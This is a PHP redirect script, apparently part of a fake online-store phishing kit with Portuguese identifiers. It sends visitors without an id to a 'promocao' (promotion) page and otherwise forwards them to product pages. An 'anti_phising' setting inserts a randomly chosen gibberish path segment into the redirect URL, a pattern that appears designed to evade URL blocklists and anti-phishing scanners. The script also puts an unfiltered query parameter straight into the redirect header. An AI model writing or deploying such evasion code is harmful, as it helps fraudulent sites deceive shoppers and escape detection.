<?php

ob_start();
session_start();

require_once ("Raiz/admin/function/config.php");
require_once ("Raiz/admin/function/conexao.php");
require_once ("Raiz/admin/function/funcions.php");

while ($consulta2= $con2 -> fetch_array()){
	
	$alterna = $consulta2 ["alterna"];
	$anti_phising = $consulta2 ["anti_phising"];

	
	
}





if ( empty ($_GET ['id'] ) and ($alterna == 1) ) {
	
	 header("Location: promocao.php");


	
} else 
{
	










$NUMERO = $anti_phising ;

$ID_FILTRADO = filter_var($_GET ['id'], FILTER_SANITIZE_NUMBER_INT);


$coleta1 =  addslashes($ID_FILTRADO);
$coleta2 = $_GET ['category'];

$palavras = array('26544VVaas_ahsga_!!sa4', 'AeaEAAAgv_assCresa4_a', 'Askjvvv_sasas4_4_sas-55', 'hnjhashbBsauh!lsa22__-sa', 'KAIsnudnuanadad54da' , 'LladadVas_sa45d6520', 'Pksjahsas-554as4vvas_445as', 'PljsahVVaddbh4420000sa', 'PmvVsa2222454545da', 'Ppsan__sasvv=d-d!dad1', 'PujtdgdbanbVV_sasd!!@');
$aleatorio = rand(0, 11);
$string =  $palavras[$aleatorio];

$junta1 = ''.$string.'/produto.php?'.$coleta2.'&id='.$coleta1.'';
$junta2 = 'Produto/?'.$coleta2.'&id='.$coleta1.'';


if (($NUMERO == 1) ) {
 header("Location: $junta1");
}
else{
	
 header("Location: $junta2");
 
}


}


?>




